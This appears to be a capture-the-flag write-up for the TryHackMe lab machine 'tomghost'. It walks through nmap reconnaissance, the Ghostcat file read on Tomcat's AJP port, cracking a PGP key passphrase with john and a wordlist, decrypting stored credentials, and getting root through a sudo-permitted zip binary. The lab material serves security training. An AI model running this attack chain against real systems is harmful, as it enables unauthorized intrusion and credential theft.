---
title: tomghost
description: Writeup for the TryHackMe machine tomghost
date: 2020-03-27
categories: [TryHackMe]
tags: [try-hack-me,thm]
---

## Recon

### nmap

`nmap` finds four open ports: SHH (22), an unknown service (53), Apache Jserv (8009) and HTTP (8080).
```
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/9.0.30
```

### AJP13 - TCP 8009

Searching for Apache JServ vulnerabilities leads to CVE-2020-1938 (Ghostcat) - a file read vulnerability that allows an attacker to retrieve sensitive files, such as `WEB-INF/web.xml`, which often contains credentials.

## HTTP - TCP 8080

The web service running on port 8080 serves the default Apache Tomcat welcome page.

## Shell as skyfuck

I exploit the Ghostcat vulnerability in Apache Jserv with the Metasploit module `auxiliary/admin/http/tomcat_ghostcat` to read the `/WEB-INF/web.xml` file.
```
<?xml version="1.0" encoding="UTF-8"?>

<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
        skyfuck:<REDACTED>
  </description>

</web-app>
```
I connect via SSH as the user `skyfuck`.

## Shell as merlin

Inspecting `skyfuck`’s home directory reveals two interesting files:
```console
skyfuck@ubuntu:~$ ls 
credential.pgp  tryhackme.asc
```
The file `tryhackme.asc` is a private PGP key and `credential.pgp` is an encrypted message. To recover the passphrase, I extract a hash using `gpg2john` and cracked it with `john`:
```console
$ gpg2john tryhackme.asc > hash.txt
$ john -w=/usr/share/wordlists/rockyou.txt hash.txt    
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<REDACTED>        (tryhackme)     
1g 0:00:00:00 DONE (2025-04-10 16:45) 10.00g/s 10720p/s 10720c/s 10720C/s marshall..alexandru
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Once cracked, I import the PGP private key:
```console
$ gpg --import tryhackme.asc
```
And decrypt the `credential.pgp` file, revealing the credentials of the user `merlin`:
```console
$ gpg -d credential.pgp
merlin:<REDACTED>
```

## Shell as root

After switching to `merlin`, I check `sudo` privileges:
```console
$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```
Using [GTFOBins](https://gtfobins.github.io/gtfobins/zip/#sudo), I exploit `zip` to escalate privileges and gain a root shell.
